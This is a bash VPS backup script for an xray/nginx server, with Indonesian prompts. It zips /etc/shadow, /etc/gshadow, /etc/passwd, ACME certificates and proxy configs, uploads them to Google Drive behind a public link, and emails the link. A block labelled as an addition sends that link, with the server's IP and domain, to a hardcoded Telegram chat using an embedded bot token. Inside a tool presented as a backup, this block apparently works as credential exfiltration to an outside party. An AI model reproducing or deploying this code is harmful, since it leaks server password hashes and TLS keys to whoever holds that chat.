#!/bin/bash
CHATID="6430177985"
KEY="9224861213:AAG7P45p7wV5NGqz_xOWMYeCMo2XvUmK8ug"
export TIME="10"
export URL="https://api.telegram.org/bot$KEY/sendMessage"
clear
clear
IP=$(wget -qO- ipinfo.io/ip)
date=$(date +"%Y-%m-%d")
email=$(cat /home/email)
domain=$(cat /etc/xray/domain)
if [[ "$email" = "" ]]; then
  echo "Masukkan Email Untuk Menerima Backup"
  read -rp "Email : " -e email
  echo "$email" > /home/email
fi
clear
echo "Mohon Menunggu, Proses Backup sedang berlangsung !!"
rm -rf /root/backup
mkdir -p /root/backup
cp -r /root/.acme.sh /root/backup/ &> /dev/null
cp /etc/passwd /root/backup/ &> /dev/null
cp /etc/group /root/backup/ &> /dev/null
cp /etc/shadow /root/backup/ &> /dev/null
cp /etc/gshadow /root/backup/ &> /dev/null
cp -r /var/lib/scrz-prem/ /root/backup/scrz-prem &> /dev/null
cp -r /etc/xray /root/backup/xray &> /dev/null
cp -r /etc/nginx /root/backup/nginx &> /dev/null
cd /root
zip -r $IP-$date.zip backup > /dev/null 2>&1
rclone copy /root/$IP-$date.zip dr:backup/
url=$(rclone link dr:backup/$IP-$date.zip)
id=$(echo $url | grep '^https' | cut -d'=' -f2)
link="https://drive.google.com/u/4/uc?id=${id}&export=download"
# === TAMBAHAN KIRIM LINK NENG BOT TELE - LAINE GAK DIUBAH ===
TEXT="<code>◇━━━━━━━━━━━━━━◇</code>
<b>   ⚠️BACKUP NOTIF⚠️</b>
<b>     Detail Backup VPS</b>
<b>     VPS PRIBADI </b>
<code>◇━━━━━━━━━━━━━━◇</code>
<b>IP VPS  :</b> <code>${IP}</code>
<b>DOMAIN :</b> <code>${domain}</code>
<b>Tanggal : $date</b>
<code>◇━━━━━━━━━━━━━━◇</code>
<b>Link Backup   :</b> $link
<code>◇━━━━━━━━━━━━━━◇</code>
<code>Silahkan copy Link dan restore di VPS baru</code>"
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
# === SELESAI TAMBAHAN ===
echo -e "
Detail Backup Arya Blitar

IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date

" | mail -s "Backup Data" $email
rm -rf /root/backup
rm -f /root/$IP-$date.zip
clear
echo -e "
Detail Backup Arya Blitar

IP VPS        : $IP
Link Backup   : $link
Tanggal       : $date

"
echo "Silahkan copy Link dan restore di VPS baru"
echo ""
read -n 1 -s -r -p "   Press any key to back on menu"
menu
